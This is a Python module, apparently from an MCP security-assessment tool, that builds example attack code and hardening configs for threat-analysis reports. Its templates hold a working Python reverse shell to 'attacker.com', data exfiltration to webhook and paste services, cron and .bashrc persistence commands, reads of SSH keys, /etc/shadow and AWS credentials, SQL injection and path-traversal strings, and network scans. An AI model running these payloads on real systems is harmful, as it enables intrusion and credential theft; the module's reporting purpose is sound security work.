"""
Dynamic Example Generator for Threat Analysis

This module generates realistic code examples, command sequences, and attack payloads
for threat analysis reports based on discovered MCP tool capabilities.
"""

import re
import json
import base64
import logging
from typing import Dict, List, Optional, Any, Union
from enum import Enum
from dataclasses import dataclass, field
from datetime import datetime

from .models import (
    ThreatAnalysis, ToolCapabilities, EnvironmentContext, 
    AttackVector, AbuseScenario, CapabilityCategory
)
from ..mcp_introspection.models import MCPTool, MCPServerInfo


logger = logging.getLogger(__name__)


class ExampleType(Enum):
    """Types of examples that can be generated."""
    CODE_SNIPPET = "code_snippet"
    COMMAND_SEQUENCE = "command_sequence"
    PAYLOAD = "payload" 
    CONFIGURATION = "configuration"
    EXPLOIT_POC = "exploit_poc"
    DETECTION_RULE = "detection_rule"


class ExampleLanguage(Enum):
    """Programming languages for code examples."""
    PYTHON = "python"
    JAVASCRIPT = "javascript"
    BASH = "bash"
    POWERSHELL = "powershell"
    SQL = "sql"
    JSON = "json"
    YAML = "yaml"


class ExampleComplexity(Enum):
    """Complexity levels for generated examples."""
    BASIC = "basic"
    INTERMEDIATE = "intermediate"
    ADVANCED = "advanced"


@dataclass
class GeneratedExample:
    """Represents a generated code example or command."""
    
    example_type: ExampleType
    language: ExampleLanguage
    title: str
    description: str
    code: str
    complexity: ExampleComplexity
    prerequisites: List[str] = field(default_factory=list)
    notes: List[str] = field(default_factory=list)
    related_tools: List[str] = field(default_factory=list)
    risk_level: str = "medium"
    timestamp: datetime = field(default_factory=datetime.now)
    
    def to_html(self) -> str:
        """Convert example to HTML format for reports."""
        return f"""
        <div class="generated-example {self.complexity.value}">
            <div class="example-header">
                <h4>{self.title}</h4>
                <span class="example-type">{self.example_type.value}</span>
                <span class="example-language">{self.language.value}</span>
                <span class="risk-level risk-{self.risk_level}">{self.risk_level.upper()}</span>
            </div>
            <div class="example-description">
                <p>{self.description}</p>
            </div>
            <div class="code-block">
                <pre><code class="language-{self.language.value}">{self.code}</code></pre>
            </div>
            {self._render_prerequisites()}
            {self._render_notes()}
        </div>
        """
    
    def _render_prerequisites(self) -> str:
        """Render prerequisites section."""
        if not self.prerequisites:
            return ""
        
        items = "".join(f"<li>{prereq}</li>" for prereq in self.prerequisites)
        return f"""
        <div class="example-prerequisites">
            <h5>Prerequisites:</h5>
            <ul>{items}</ul>
        </div>
        """
    
    def _render_notes(self) -> str:
        """Render notes section."""
        if not self.notes:
            return ""
        
        items = "".join(f"<li>{note}</li>" for note in self.notes)
        return f"""
        <div class="example-notes">
            <h5>Notes:</h5>
            <ul>{items}</ul>
        </div>
        """


@dataclass
class ExampleGenerationContext:
    """Context information for example generation."""
    
    tool_capabilities: ToolCapabilities
    environment_context: EnvironmentContext
    threat_analysis: Optional[ThreatAnalysis] = None
    server_info: Optional[MCPServerInfo] = None
    target_audience: str = "security_analyst"  # security_analyst, developer, executive
    include_mitigations: bool = True
    sanitize_sensitive: bool = True


class DynamicExampleGenerator:
    """Generates dynamic code examples and commands for threat analysis."""
    
    def __init__(self):
        """Initialize the example generator."""
        self.logger = logging.getLogger(self.__class__.__name__)
        self.example_templates: Dict[str, Dict[str, str]] = {}
        self.capability_patterns: Dict[CapabilityCategory, List[str]] = {}
        self._initialize_templates()
        self._initialize_patterns()
    
    def generate_examples_for_analysis(self, 
                                     context: ExampleGenerationContext) -> List[GeneratedExample]:
        """
        Generate a comprehensive set of examples for a threat analysis.
        
        Args:
            context: Generation context with tool and environment information
            
        Returns:
            List[GeneratedExample]: Generated examples
        """
        examples = []
        
        # Generate examples based on tool capabilities
        for capability in context.tool_capabilities.categories:
            capability_examples = self._generate_capability_examples(
                capability, context
            )
            examples.extend(capability_examples)
        
        # Generate attack chain examples if threat analysis available
        if context.threat_analysis and context.threat_analysis.attack_vectors:
            chain_examples = self._generate_attack_chain_examples(context)
            examples.extend(chain_examples)
        
        # Generate mitigation examples if requested
        if context.include_mitigations:
            mitigation_examples = self._generate_mitigation_examples(context)
            examples.extend(mitigation_examples)
        
        # Sort by risk level and complexity
        examples.sort(key=lambda x: (
            self._risk_priority(x.risk_level),
            self._complexity_priority(x.complexity)
        ), reverse=True)
        
        return examples[:10]  # Limit to top 10 examples
    
    def generate_code_snippet(self,
                            tool_name: str,
                            capability: str,
                            language: ExampleLanguage,
                            complexity: ExampleComplexity = ExampleComplexity.INTERMEDIATE) -> GeneratedExample:
        """
        Generate a specific code snippet for a tool capability.
        
        Args:
            tool_name: Name of the MCP tool
            capability: Specific capability to demonstrate
            language: Programming language for the snippet
            complexity: Complexity level
            
        Returns:
            GeneratedExample: Generated code snippet
        """
        template_key = f"{capability}_{language.value}_{complexity.value}"
        template = self.example_templates.get("code_snippets", {}).get(template_key)
        
        if not template:
            # Fall back to generic template
            template = self._get_generic_template(capability, language)
        
        # Generate specific code
        code = self._fill_template(template, {
            'tool_name': tool_name,
            'capability': capability,
            'timestamp': datetime.now().isoformat()
        })
        
        return GeneratedExample(
            example_type=ExampleType.CODE_SNIPPET,
            language=language,
            title=f"{tool_name} - {capability.replace('_', ' ').title()} Example",
            description=f"Example code demonstrating {capability} capability of {tool_name}",
            code=code,
            complexity=complexity,
            related_tools=[tool_name]
        )
    
    def generate_command_sequence(self,
                                attack_vector: AttackVector,
                                context: ExampleGenerationContext) -> GeneratedExample:
        """
        Generate a command sequence for an attack vector.
        
        Args:
            attack_vector: Attack vector to generate commands for
            context: Generation context
            
        Returns:
            GeneratedExample: Generated command sequence
        """
        commands = []
        
        # Step-by-step commands based on attack vector
        for i, step in enumerate(attack_vector.steps, 1):
            cmd = self._generate_step_command(step, context, i)
            if cmd:
                commands.append(cmd)
        
        command_sequence = "\n".join(commands)
        
        return GeneratedExample(
            example_type=ExampleType.COMMAND_SEQUENCE,
            language=ExampleLanguage.BASH,
            title=f"Attack Sequence: {attack_vector.vector_type}",
            description=f"Command sequence for {attack_vector.description}",
            code=command_sequence,
            complexity=self._assess_attack_complexity(attack_vector),
            risk_level=attack_vector.severity.value.lower(),
            prerequisites=self._extract_prerequisites(attack_vector),
            notes=[
                "⚠️ FOR EDUCATIONAL/TESTING PURPOSES ONLY",
                "Ensure proper authorization before execution",
                "Monitor system logs during testing"
            ]
        )
    
    def generate_payload_example(self,
                               capability: CapabilityCategory,
                               context: ExampleGenerationContext) -> Optional[GeneratedExample]:
        """
        Generate a payload example for a specific capability.
        
        Args:
            capability: Capability category
            context: Generation context
            
        Returns:
            Optional[GeneratedExample]: Generated payload example
        """
        payload_generators = {
            CapabilityCategory.FILE_SYSTEM: self._generate_file_system_payload,
            CapabilityCategory.NETWORK_ACCESS: self._generate_network_payload,
            CapabilityCategory.CODE_EXECUTION: self._generate_code_execution_payload,
            CapabilityCategory.DATABASE_ACCESS: self._generate_database_payload,
        }
        
        generator = payload_generators.get(capability)
        if not generator:
            return None
        
        return generator(context)
    
    def _generate_capability_examples(self,
                                    capability: CapabilityCategory,
                                    context: ExampleGenerationContext) -> List[GeneratedExample]:
        """Generate examples for a specific capability category."""
        examples = []
        
        # Code snippet example
        code_example = self._generate_capability_code_example(capability, context)
        if code_example:
            examples.append(code_example)
        
        # Payload example
        payload_example = self.generate_payload_example(capability, context)
        if payload_example:
            examples.append(payload_example)
        
        # Configuration example
        config_example = self._generate_capability_config_example(capability, context)
        if config_example:
            examples.append(config_example)
        
        return examples
    
    def _generate_attack_chain_examples(self,
                                      context: ExampleGenerationContext) -> List[GeneratedExample]:
        """Generate examples for attack chains."""
        examples = []
        
        if not context.threat_analysis or not context.threat_analysis.attack_vectors:
            return examples
        
        for i, attack_vector in enumerate(context.threat_analysis.attack_vectors[:3]):
            # Generate command sequence for each attack vector
            cmd_example = self.generate_command_sequence(attack_vector, context)
            examples.append(cmd_example)
            
            # Generate exploit POC if high risk
            if attack_vector.severity.value.lower() in ['high', 'critical']:
                poc_example = self._generate_exploit_poc(attack_vector, context)
                if poc_example:
                    examples.append(poc_example)
        
        return examples
    
    def _generate_mitigation_examples(self,
                                    context: ExampleGenerationContext) -> List[GeneratedExample]:
        """Generate mitigation code examples."""
        examples = []
        
        if not context.threat_analysis or not context.threat_analysis.mitigation_strategies:
            return examples
        
        for mitigation in context.threat_analysis.mitigation_strategies[:2]:
            # Generate configuration example for mitigation
            config_example = GeneratedExample(
                example_type=ExampleType.CONFIGURATION,
                language=ExampleLanguage.JSON,
                title=f"Mitigation: {mitigation.strategy_type}",
                description=f"Configuration example for {mitigation.description}",
                code=self._generate_mitigation_config(mitigation, context),
                complexity=ExampleComplexity.INTERMEDIATE,
                risk_level="low",
                notes=[
                    "✅ Security hardening configuration",
                    "Test in development environment first",
                    "Monitor for functionality impact"
                ]
            )
            examples.append(config_example)
        
        return examples
    
    def _generate_capability_code_example(self,
                                        capability: CapabilityCategory,
                                        context: ExampleGenerationContext) -> Optional[GeneratedExample]:
        """Generate code example for a capability."""
        tool_name = context.tool_capabilities.tool_name
        
        code_generators = {
            CapabilityCategory.FILE_SYSTEM: lambda: self._generate_file_system_code(context),
            CapabilityCategory.NETWORK_ACCESS: lambda: self._generate_network_code(context),
            CapabilityCategory.CODE_EXECUTION: lambda: self._generate_code_execution_code(context),
            CapabilityCategory.DATABASE_ACCESS: lambda: self._generate_database_code(context),
            CapabilityCategory.EXTERNAL_INTEGRATION: lambda: self._generate_integration_code(context),
        }
        
        generator = code_generators.get(capability)
        if not generator:
            return None
        
        code = generator()
        if not code:
            return None
        
        return GeneratedExample(
            example_type=ExampleType.CODE_SNIPPET,
            language=ExampleLanguage.PYTHON,
            title=f"{tool_name} - {capability.value.replace('_', ' ').title()}",
            description=f"Example demonstrating {capability.value} usage",
            code=code,
            complexity=ExampleComplexity.INTERMEDIATE,
            related_tools=[tool_name]
        )
    
    def _generate_file_system_code(self, context: ExampleGenerationContext) -> str:
        """Generate file system related code example."""
        tool_name = context.tool_capabilities.tool_name
        return f'''#!/usr/bin/env python3
"""
File System Access Example - {tool_name}
⚠️ Educational/Testing Purpose Only
"""

import os
import json
from pathlib import Path

# Connect to MCP server
def demonstrate_file_access():
    """Demonstrate file system access capabilities."""
    
    # Example 1: Directory traversal attempt
    sensitive_paths = [
        "/etc/passwd",
        "/etc/shadow", 
        "~/.ssh/id_rsa",
        "~/.aws/credentials",
        "../../../etc/passwd"
    ]
    
    for path in sensitive_paths:
        try:
            # Simulate file access request
            result = request_file_access(path)
            if result:
                print(f"[!] Sensitive file accessible: {{path}}")
        except Exception as e:
            print(f"[.] Path blocked: {{path}} - {{e}}")
    
    # Example 2: Enumerate readable directories
    try:
        dirs = list_directories("/")
        print(f"[+] Found {{len(dirs)}} directories")
        
        # Look for interesting directories
        interesting = ["home", "var", "opt", "tmp"]
        for dir_name in dirs:
            if any(keyword in dir_name.lower() for keyword in interesting):
                print(f"[!] Interesting directory: {{dir_name}}")
                
    except Exception as e:
        print(f"[x] Directory enumeration failed: {{e}}")

def request_file_access(file_path: str):
    """Request file access through MCP tool."""
    # This would interact with the actual MCP tool
    return f"File content simulation for {{file_path}}"

def list_directories(base_path: str):
    """List directories through MCP tool."""
    # This would interact with the actual MCP tool 
    return ["home", "var", "opt", "tmp", "etc"]

if __name__ == "__main__":
    print("🔍 Testing file system access capabilities...")
    demonstrate_file_access()
'''
    
    def _generate_network_code(self, context: ExampleGenerationContext) -> str:
        """Generate network access related code example."""
        tool_name = context.tool_capabilities.tool_name
        return f'''#!/usr/bin/env python3
"""
Network Access Example - {tool_name}
⚠️ Educational/Testing Purpose Only
"""

import socket
import requests
import subprocess
from urllib.parse import urlparse

def demonstrate_network_access():
    """Demonstrate network access capabilities."""
    
    # Example 1: Internal network scanning
    internal_ranges = [
        "192.168.1.0/24",
        "10.0.0.0/24", 
        "172.16.0.0/24"
    ]
    
    for range_addr in internal_ranges:
        print(f"[+] Scanning range: {{range_addr}}")
        try:
            hosts = scan_network_range(range_addr)
            print(f"[!] Found {{len(hosts)}} hosts in {{range_addr}}")
        except Exception as e:
            print(f"[x] Scan failed: {{e}}")
    
    # Example 2: External data exfiltration
    exfil_endpoints = [
        "https://webhook.site/unique-id",
        "https://pastebin.com/api/api_post.php",
        "https://discord.com/api/webhooks/...",
    ]
    
    for endpoint in exfil_endpoints:
        print(f"[+] Testing exfiltration to: {{endpoint}}")
        try:
            result = exfiltrate_data(endpoint, "sensitive_data_sample")
            if result:
                print(f"[!] Data exfiltration successful to {{endpoint}}")
        except Exception as e:
            print(f"[x] Exfiltration blocked: {{e}}")

def scan_network_range(cidr_range: str):
    """Scan network range for active hosts."""
    # Simulate network scanning
    return [f"192.168.1.{{i}}" for i in range(1, 10)]

def exfiltrate_data(endpoint: str, data: str):
    """Attempt data exfiltration to external endpoint."""
    try:
        # Simulate data exfiltration attempt
        response = requests.post(endpoint, data={{"data": data}}, timeout=5)
        return response.status_code == 200
    except:
        return False

if __name__ == "__main__":
    print("🌐 Testing network access capabilities...")
    demonstrate_network_access()
'''
    
    def _generate_code_execution_code(self, context: ExampleGenerationContext) -> str:
        """Generate code execution related code example."""
        tool_name = context.tool_capabilities.tool_name
        return f'''#!/usr/bin/env python3
"""
Code Execution Example - {tool_name}
⚠️ Educational/Testing Purpose Only - HIGH RISK
"""

import subprocess
import os
import sys
from pathlib import Path

def demonstrate_code_execution():
    """Demonstrate code execution capabilities."""
    
    # Example 1: System information gathering
    info_commands = [
        "whoami",
        "id", 
        "uname -a",
        "ps aux",
        "netstat -tulpn",
        "env"
    ]
    
    print("[+] Gathering system information...")
    for cmd in info_commands:
        try:
            result = execute_command(cmd)
            print(f"[!] {{cmd}}: {{result[:100]}}")
        except Exception as e:
            print(f"[x] Command failed: {{cmd}} - {{e}}")
    
    # Example 2: Privilege escalation attempts
    privesc_commands = [
        "sudo -l",
        "find / -perm -4000 2>/dev/null",  # SUID binaries
        "cat /etc/crontab",
        "find /var/log -readable 2>/dev/null"
    ]
    
    print("[+] Checking privilege escalation opportunities...")
    for cmd in privesc_commands:
        try:
            result = execute_command(cmd)
            if result:
                print(f"[!] Potential escalation vector: {{cmd}}")
        except Exception as e:
            print(f"[.] No access: {{cmd}}")
    
    # Example 3: Persistence mechanisms
    persistence_methods = [
        "echo 'malicious_payload' >> ~/.bashrc",
        "crontab -l",
        "(crontab -l; echo '*/5 * * * * /tmp/backdoor') | crontab -"
    ]
    
    print("[+] Testing persistence mechanisms...")
    for method in persistence_methods:
        try:
            result = execute_command(method)
            print(f"[!] Persistence method viable: {{method}}")
        except Exception as e:
            print(f"[x] Persistence blocked: {{method}}")

def execute_command(command: str) -> str:
    """Execute system command through MCP tool."""
    try:
        # This would interact with the actual MCP tool
        result = subprocess.run(
            command, 
            shell=True, 
            capture_output=True, 
            text=True, 
            timeout=10
        )
        return result.stdout if result.returncode == 0 else result.stderr
    except subprocess.TimeoutExpired:
        return "Command timed out"
    except Exception as e:
        return f"Execution error: {{e}}"

if __name__ == "__main__":
    print("⚡ Testing code execution capabilities...")
    print("⚠️  WARNING: This may trigger security alerts!")
    demonstrate_code_execution()
'''
    
    def _generate_database_code(self, context: ExampleGenerationContext) -> str:
        """Generate database access related code example."""
        return '''#!/usr/bin/env python3
"""
Database Access Example
⚠️ Educational/Testing Purpose Only
"""

import sqlite3
import json
from typing import List, Dict, Any

def demonstrate_database_access():
    """Demonstrate database access capabilities."""
    
    # Example 1: SQL injection attempts
    injection_payloads = [
        "' OR '1'='1",
        "'; DROP TABLE users; --",
        "' UNION SELECT user(), database(), version() --",
        "' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a"
    ]
    
    print("[+] Testing SQL injection vulnerabilities...")
    for payload in injection_payloads:
        try:
            result = test_sql_injection(payload)
            if result:
                print(f"[!] SQL injection successful: {payload}")
        except Exception as e:
            print(f"[x] Payload blocked: {payload}")
    
    # Example 2: Database enumeration
    enum_queries = [
        "SELECT name FROM sqlite_master WHERE type='table'",  # SQLite
        "SHOW TABLES",  # MySQL
        "SELECT table_name FROM information_schema.tables",  # PostgreSQL/MySQL
        "SELECT * FROM sys.tables"  # SQL Server
    ]
    
    print("[+] Enumerating database structure...")
    for query in enum_queries:
        try:
            result = execute_query(query)
            print(f"[!] Query successful: {query}")
            print(f"    Result: {result}")
        except Exception as e:
            print(f"[x] Query failed: {query}")

def test_sql_injection(payload: str) -> bool:
    """Test SQL injection payload."""
    # Simulate SQL injection test
    return "OR" in payload and "1=1" in payload

def execute_query(query: str) -> List[Dict[str, Any]]:
    """Execute database query through MCP tool."""
    # This would interact with the actual MCP tool
    return [{"table": "users"}, {"table": "products"}]

if __name__ == "__main__":
    print("🗄️ Testing database access capabilities...")
    demonstrate_database_access()
'''
    
    def _generate_integration_code(self, context: ExampleGenerationContext) -> str:
        """Generate external integration related code example."""
        return '''#!/usr/bin/env python3
"""
External Integration Example
⚠️ Educational/Testing Purpose Only
"""

import requests
import json
import base64
from typing import Dict, Any

def demonstrate_external_integration():
    """Demonstrate external integration capabilities."""
    
    # Example 1: API key extraction and testing
    potential_api_keys = [
        "sk-...",  # OpenAI
        "AIza...",  # Google
        "AKIA...",  # AWS
        "xoxb-...",  # Slack
        "ghp_..."  # GitHub
    ]
    
    print("[+] Testing for exposed API keys...")
    for key_pattern in potential_api_keys:
        try:
            keys = find_api_keys(key_pattern)
            for key in keys:
                if validate_api_key(key):
                    print(f"[!] Valid API key found: {key[:10]}...")
        except Exception as e:
            print(f"[x] Key validation failed: {e}")
    
    # Example 2: Cloud service enumeration
    cloud_endpoints = [
        "https://s3.amazonaws.com/",
        "https://management.azure.com/",
        "https://www.googleapis.com/",
        "https://api.github.com/"
    ]
    
    print("[+] Enumerating cloud service access...")
    for endpoint in cloud_endpoints:
        try:
            access_level = test_cloud_access(endpoint)
            print(f"[!] {endpoint}: {access_level}")
        except Exception as e:
            print(f"[x] No access to {endpoint}")

def find_api_keys(pattern: str) -> List[str]:
    """Find API keys matching pattern."""
    # Simulate API key discovery
    return [f"{pattern}1234567890abcdef"]

def validate_api_key(api_key: str) -> bool:
    """Validate API key by testing endpoint."""
    # Simulate API key validation
    return len(api_key) > 10

def test_cloud_access(endpoint: str) -> str:
    """Test access level to cloud endpoint."""
    try:
        response = requests.get(endpoint, timeout=5)
        if response.status_code == 200:
            return "Full access"
        elif response.status_code == 401:
            return "Authentication required"
        else:
            return f"Status: {response.status_code}"
    except:
        return "No access"

if __name__ == "__main__":
    print("☁️ Testing external integration capabilities...")
    demonstrate_external_integration()
'''
    
    def _generate_step_command(self, step: Any, context: ExampleGenerationContext, step_num: int) -> str:
        """Generate command for a specific attack step."""
        # This would be more sophisticated in practice
        return f"# Step {step_num}: {getattr(step, 'description', 'Execute attack step')}\necho 'Executing step {step_num}'"
    
    def _assess_attack_complexity(self, attack_vector: AttackVector) -> ExampleComplexity:
        """Assess complexity of an attack vector."""
        if attack_vector.severity.value.lower() == 'critical':
            return ExampleComplexity.ADVANCED
        elif attack_vector.severity.value.lower() == 'high':
            return ExampleComplexity.INTERMEDIATE
        else:
            return ExampleComplexity.BASIC
    
    def _extract_prerequisites(self, attack_vector: AttackVector) -> List[str]:
        """Extract prerequisites from attack vector."""
        return [
            "Network access to target system",
            "Basic understanding of command line",
            "Appropriate testing authorization"
        ]
    
    def _generate_file_system_payload(self, context: ExampleGenerationContext) -> GeneratedExample:
        """Generate file system payload example."""
        return GeneratedExample(
            example_type=ExampleType.PAYLOAD,
            language=ExampleLanguage.BASH,
            title="File System Traversal Payload",
            description="Path traversal payload for file system access",
            code="""# Directory traversal payloads
../../../etc/passwd
....//....//....//etc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
..%252f..%252f..%252fetc%252fpasswd""",
            complexity=ExampleComplexity.INTERMEDIATE,
            risk_level="high"
        )
    
    def _generate_network_payload(self, context: ExampleGenerationContext) -> GeneratedExample:
        """Generate network payload example."""
        return GeneratedExample(
            example_type=ExampleType.PAYLOAD,
            language=ExampleLanguage.BASH,
            title="Network Scanning Payload",
            description="Network reconnaissance and scanning payload",
            code="""#!/bin/bash
# Network reconnaissance payload
nmap -sS -O -A 192.168.1.0/24
nc -zv 192.168.1.1 1-65535
curl -s http://169.254.169.254/latest/meta-data/  # AWS metadata
""",
            complexity=ExampleComplexity.ADVANCED,
            risk_level="high"
        )
    
    def _generate_code_execution_payload(self, context: ExampleGenerationContext) -> GeneratedExample:
        """Generate code execution payload example."""
        return GeneratedExample(
            example_type=ExampleType.PAYLOAD,
            language=ExampleLanguage.PYTHON,
            title="Remote Code Execution Payload",
            description="Payload for achieving remote code execution",
            code='''import os, subprocess, socket
# Reverse shell payload
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("attacker.com", 4444))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(["/bin/sh", "-i"])''',
            complexity=ExampleComplexity.ADVANCED,
            risk_level="critical",
            notes=["⚠️ EXTREMELY DANGEROUS - Testing only!", "Use only in isolated environments"]
        )
    
    def _generate_database_payload(self, context: ExampleGenerationContext) -> GeneratedExample:
        """Generate database payload example."""
        return GeneratedExample(
            example_type=ExampleType.PAYLOAD,
            language=ExampleLanguage.SQL,
            title="SQL Injection Payload",
            description="SQL injection payload for database access",
            code="""-- SQL injection payloads
' OR '1'='1' --
'; DROP TABLE users; --
' UNION SELECT user(), password FROM mysql.user --
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE id=1)='a' --""",
            complexity=ExampleComplexity.INTERMEDIATE,
            risk_level="high"
        )
    
    def _generate_capability_config_example(self, capability: CapabilityCategory, context: ExampleGenerationContext) -> Optional[GeneratedExample]:
        """Generate configuration example for capability."""
        if capability == CapabilityCategory.FILE_SYSTEM:
            return GeneratedExample(
                example_type=ExampleType.CONFIGURATION,
                language=ExampleLanguage.JSON,
                title="File System Access Configuration",
                description="Configuration example for restricting file system access",
                code='''{
  "file_access": {
    "allowed_paths": ["/app/data", "/tmp"],
    "forbidden_paths": ["/etc", "/root", "/home"],
    "max_file_size": "10MB",
    "allow_symbolic_links": false
  },
  "security": {
    "sandbox_mode": true,
    "log_all_access": true,
    "deny_by_default": true
  }
}''',
                complexity=ExampleComplexity.BASIC,
                risk_level="low"
            )
        return None
    
    def _generate_exploit_poc(self, attack_vector: AttackVector, context: ExampleGenerationContext) -> Optional[GeneratedExample]:
        """Generate exploit proof of concept."""
        return GeneratedExample(
            example_type=ExampleType.EXPLOIT_POC,
            language=ExampleLanguage.PYTHON,
            title=f"Exploit POC: {attack_vector.vector_type}",
            description=f"Proof of concept exploit for {attack_vector.description}",
            code=f'''#!/usr/bin/env python3
"""
Exploit POC: {attack_vector.vector_type}
Severity: {attack_vector.severity.value}
⚠️ FOR SECURITY RESEARCH ONLY
"""

def exploit():
    """Proof of concept exploit implementation."""
    print("[+] Starting exploit...")
    
    # Step 1: Initial reconnaissance
    target_info = gather_target_info()
    print(f"[+] Target info: {{target_info}}")
    
    # Step 2: Vulnerability exploitation
    if exploit_vulnerability():
        print("[!] Exploitation successful!")
        return True
    else:
        print("[x] Exploitation failed")
        return False

def gather_target_info():
    """Gather information about target."""
    return {{"target": "MCP Server", "vulnerability": "{attack_vector.vector_type}"}}

def exploit_vulnerability():
    """Execute the vulnerability exploitation."""
    # POC implementation would go here
    return True

if __name__ == "__main__":
    exploit()
''',
            complexity=ExampleComplexity.ADVANCED,
            risk_level=attack_vector.severity.value.lower(),
            notes=[
                "⚠️ Proof of concept only",
                "Requires proper authorization",
                "Monitor for detection during testing"
            ]
        )
    
    def _generate_mitigation_config(self, mitigation: Any, context: ExampleGenerationContext) -> str:
        """Generate mitigation configuration."""
        return '''{
  "security_hardening": {
    "access_control": {
      "require_authentication": true,
      "minimum_privilege": true,
      "session_timeout": 3600
    },
    "monitoring": {
      "log_all_requests": true,
      "alert_on_suspicious": true,
      "rate_limiting": {
        "requests_per_minute": 60
      }
    },
    "validation": {
      "input_sanitization": true,
      "output_encoding": true,
      "path_traversal_protection": true
    }
  }
}'''
    
    def _initialize_templates(self):
        """Initialize example templates."""
        self.example_templates = {
            "code_snippets": {},
            "command_sequences": {},
            "payloads": {},
            "configurations": {}
        }
    
    def _initialize_patterns(self):
        """Initialize capability patterns."""
        self.capability_patterns = {
            CapabilityCategory.FILE_SYSTEM: [
                r"file.*read", r"file.*write", r"directory.*list", r"path.*traverse"
            ],
            CapabilityCategory.NETWORK_ACCESS: [
                r"http.*request", r"socket.*connect", r"dns.*resolve", r"network.*scan"
            ],
            CapabilityCategory.CODE_EXECUTION: [
                r"exec.*command", r"run.*script", r"process.*spawn", r"shell.*execute"
            ]
        }
    
    def _get_generic_template(self, capability: str, language: ExampleLanguage) -> str:
        """Get generic template for capability and language."""
        return f"# Generic {capability} example in {language.value}\n# Capability demonstration code here"
    
    def _fill_template(self, template: str, variables: Dict[str, str]) -> str:
        """Fill template with variables."""
        for key, value in variables.items():
            template = template.replace(f"{{{key}}}", str(value))
        return template
    
    def _risk_priority(self, risk_level: str) -> int:
        """Get priority score for risk level."""
        priorities = {"critical": 4, "high": 3, "medium": 2, "low": 1, "minimal": 0}
        return priorities.get(risk_level.lower(), 1)
    
    def _complexity_priority(self, complexity: ExampleComplexity) -> int:
        """Get priority score for complexity level."""
        priorities = {ExampleComplexity.ADVANCED: 3, ExampleComplexity.INTERMEDIATE: 2, ExampleComplexity.BASIC: 1}
        return priorities.get(complexity, 1) 